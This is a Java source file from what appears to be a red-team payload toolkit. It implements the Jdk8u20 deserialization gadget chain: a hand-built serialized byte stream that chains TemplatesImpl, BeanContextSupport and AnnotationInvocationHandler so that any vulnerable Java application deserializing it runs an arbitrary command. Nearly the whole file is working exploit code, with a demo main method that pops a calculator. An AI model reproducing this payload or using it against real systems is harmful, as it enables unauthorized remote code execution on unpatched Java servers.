package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.JavaVersion;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;

import java.beans.beancontext.BeanContextChildSupport;
import java.beans.beancontext.BeanContextSupport;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashSet;
import java.util.LinkedHashSet;

import static java.io.ObjectStreamConstants.*;

class Converter {
    public static byte[] toBytes(Object[] objs) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(baos);
        for (Object obj : objs) {
            treatObject(dos, obj);
        }
        dos.close();
        return baos.toByteArray();
    }

    public static void treatObject(DataOutputStream dos, Object obj)
        throws IOException {
        if (obj instanceof Byte) {
            dos.writeByte((Byte) obj);
        } else if (obj instanceof Short) {
            dos.writeShort((Short) obj);
        } else if (obj instanceof Integer) {
            dos.writeInt((Integer) obj);
        } else if (obj instanceof Long) {
            dos.writeLong((Long) obj);
        } else if (obj instanceof String) {
            dos.writeUTF((String) obj);
        } else if (obj instanceof Boolean) {
            dos.writeBoolean((Boolean) obj);
        } else {
            ByteArrayOutputStream ba = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(ba);
            oos.writeObject(obj);
            oos.close();
            byte[] results = ba.toByteArray();
            dos.write(results, 4, ba.size() - 4); // 4 = skip the header
        }
    }
}


@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies()
@Authors({Authors.PWNTESTER, Authors.KORLR})
public class Jdk8u20 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        // get templates internal bytecode
        Field i = templates.getClass().getDeclaredField("_bytecodes");
        i.setAccessible(true);
        byte[][] bytecodes = (byte[][]) i.get(templates);
        if (bytecodes.length == 2) {
            bytecodes = new byte[][]{bytecodes[0]};
        }

        Object[] obj = new Object[]{
            STREAM_MAGIC, STREAM_VERSION, // stream headers

            // (1) LinkedHashSet
            TC_OBJECT,
            TC_CLASSDESC,
            LinkedHashSet.class.getName(),
            -2851667679971038690L,
            (byte) SC_SERIALIZABLE,              // flags
            (short) 0,             // field count
            TC_ENDBLOCKDATA,
            TC_CLASSDESC,          // super class
            HashSet.class.getName(),
            -5024744406713321676L,
            (byte) 3,              // flags
            (short) 0,             // field count

            // hashset class annotations
            // ========= start TemplatesTmpl ========
            TC_OBJECT,
            TC_CLASSDESC,
            TemplatesImpl.class.getName(),
            673094361519270707L,
            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE),
            (short) 5, // write some important fields
            (byte) 'I', "_indentNumber",
            (byte) 'I', "_transletIndex",
            (byte) 'Z', "_useServicesMechanism",
            (byte) '[', "_bytecodes", TC_STRING, "[[B",
            (byte) 'L', "_name", TC_STRING, "Ljava/lang/String;",
            TC_ENDBLOCKDATA,
            TC_NULL,
            1, // _indentNumber
            -1, // _transletIndex
            true, // _useServiesMechanism
            bytecodes,
            TC_STRING, "abc", // _name
            TC_BLOCKDATA, (byte) 0x01, (byte) 0x00,
            TC_ENDBLOCKDATA,
            // ======== end TemplatesTmpl ==========

            // ========= start BeanContextSupport ==========
            TC_OBJECT,
            TC_CLASSDESC,
            BeanContextSupport.class.getName(),
            -4879613978649577204L,
            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE), // WRITE_METHOD means use custom readObject method
            (short) 1, // field count
            (byte) 'I', "serializable",
            TC_ENDBLOCKDATA,

            // superclass : BeanContextChildSupport
            TC_CLASSDESC,
            BeanContextChildSupport.class.getName(),
            6328947014421475877L,
            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE),
            (short) 1,
            (byte) 'L', "beanContextChildPeer", TC_STRING, "Ljava/beans/beancontext/BeanContextChild;",
            TC_ENDBLOCKDATA,
            TC_NULL,

            // superclass data: BeanContextChildSupport
            TC_REFERENCE, baseWireHandle + 0x0e,
            TC_ENDBLOCKDATA,
            1, // serializable

            // start AnnotationInvocationHandler
            TC_OBJECT,
            TC_CLASSDESC,
            "sun.reflect.annotation.AnnotationInvocationHandler",
            6182022883658399397L,
            (byte) (SC_SERIALIZABLE | SC_WRITE_METHOD),
            (short) 2, // field count
            (byte) 'L', "memberValues", TC_STRING, "Ljava/util/Map;",
            (byte) 'L', "type", TC_STRING, "Ljava/lang/Class;",
            TC_ENDBLOCKDATA,
            TC_NULL,

            //hashmap Data
            TC_OBJECT,
            TC_CLASSDESC,
            java.util.HashMap.class.getName(),
            362498820763181265L,
            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE),
            (short) 2, // ignore fields
            (byte) 'F', "loadFactor",
            (byte) 'I', "threshold",
            TC_ENDBLOCKDATA,
            TC_NULL,

            // map values
            (byte) 0x3f, (byte) 0x40, (byte) 0x00, (byte) 0x00, // loadFactor
            12, // threshold
            TC_BLOCKDATA, (byte) 0x08, 0x10, 0x01, // table.length, size
            TC_STRING, "f5a5a608", // key
            TC_REFERENCE, baseWireHandle + 0x05, // value
            TC_ENDBLOCKDATA,

            // type value
            TC_CLASS,
            TC_CLASSDESC,
            javax.xml.transform.Templates.class.getName(),
            0L, // serialVersionUID
            (byte) (SC_WRITE_METHOD | SC_SERIALIZABLE), // flag
            (short) 0, // field count
            TC_ENDBLOCKDATA,
            TC_NULL,
            // TC_ENDBLOCKDATA, // here we can't add a TC_ENDBLOCKDATA, as the stream is not finished normally.

            TC_BLOCKDATA, (byte) 0x04, 0,
            TC_ENDBLOCKDATA,

            // ========= END BeanContextSuppport ========
            TC_ENDBLOCKDATA,
            TC_NULL,

            // end hashset class annotations


            // hashSet blockData
            TC_BLOCKDATA,
            (byte) 12,
            16,            // capacity
            (byte) 0x3f, (byte) 0x40, (byte) 0x00, (byte) 0x00,
            2,             // size

            // template object
            TC_REFERENCE, baseWireHandle + 0x05,

            // write PROXY OBJECT desc
            TC_OBJECT,
            TC_PROXYCLASSDESC,
            1, javax.xml.transform.Templates.class.getName(), // proxy interface count and its names
            TC_ENDBLOCKDATA,
            // proxy superclass desc
            TC_CLASSDESC,
            java.lang.reflect.Proxy.class.getName(),
            -2222568056686623797L,
            SC_SERIALIZABLE,
            (short) 1, // field count
            (byte) 'L', "h", TC_STRING, "Ljava/lang/reflect/InvocationHandler;",
            TC_ENDBLOCKDATA,
            TC_NULL, // no superclass
            TC_REFERENCE, baseWireHandle + 0x12,
            TC_ENDBLOCKDATA,
        };
        return Converter.toBytes(obj);
    }

    public static boolean isApplicableJavaVersion() {
        JavaVersion v = JavaVersion.getLocalVersion();
        // todo: version details
        return v != null && (v.major < 8 || (v.major == 8 && v.update <= 20));
    }

    public static void main(String[] args) throws Exception {
        args = new String[]{"linux_cmd:open /System/Applications/Calculator.app/Contents/MacOS/Calculator"};
        PayloadRunner.run(Jdk8u20.class, args);
    }
}
